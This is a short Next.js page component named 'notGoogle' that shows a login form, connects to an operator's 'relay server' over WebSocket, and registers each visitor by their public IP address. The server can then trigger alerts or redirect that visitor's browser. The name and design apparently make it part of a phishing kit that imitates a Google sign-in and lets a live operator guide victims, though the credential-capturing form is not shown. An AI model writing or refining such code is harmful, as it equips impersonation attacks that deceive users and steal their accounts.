'use client';
import { useEffect, useState } from "react";
import io from "socket.io-client";
import { useRouter } from "next/navigation";
import Login from '@/components/login/login';

const notGoogle = () => {  
  const [socket, setSocket] = useState(null);
  const [ipv4, setIpv4] = useState(null);
  const router = useRouter();

  useEffect(() => {
    const backEndIp = process.env.NEXT_PUBLIC_BACK_END_IP;
    const backEndPort = process.env.NEXT_PUBLIC_BACK_END_PORT;

    // Create a new WebSocket connection
    const newSocket = io(`ws://${backEndIp}:${backEndPort}`);

    // Set up event listeners
    newSocket.on("connect", () => {
      console.log("Connected to relay server!!!");
    });

    newSocket.on("alert", (message, { userId }) => {
      if (userId === newSocket.userId) {
        console.log("Alerting user with message: ", message);
        alert(message);
      }
    });

    newSocket.on("pushToPage", (site, { userId }) => {
      if (userId === newSocket.userId) {
        console.log("Pushing user to page: ", site);
        const url = (`/${site}`);
        console.log("redirecting to: ", url);
        router.push(url);
      }
    });

    newSocket.on("error", (error) => {
      console.error("Socket error:", error);
    });

    // Store the socket instance in state
    setSocket(newSocket);

    // Cleanup function
    return () => {
      // Disconnect socket when component unmounts
      console.log("Disconnecting from relay server!!!");
      newSocket.disconnect();
    };
  }, []); // Only run this effect once on component mount

  useEffect(() => {
    const fetchIPv4 = async () => {
      try {
        const response = await fetch(`https://api.ipify.org?format=json`);

        if (!response.ok) {
          throw new Error("Failed to fetch IPv4 address");
        }
        const result = await response.json();
        setIpv4(result.ip);
        console.log(result.ip);
      } catch (error) {
        console.error("Error fetching IPv4 address:", error.message);
      }
    };

    fetchIPv4();
  }, []);

  console.log(ipv4);

  // Ensure that socket is initialized before emitting events
  useEffect(() => {
    if (socket && ipv4) {
      socket.emit("join", ipv4);
      socket.userId = ipv4;
    }
  }, [socket, ipv4]);
  
  return (
    <div>
      <Login  argument={"notGoogle"}/>
    </div>
  );
};

export default notGoogle;
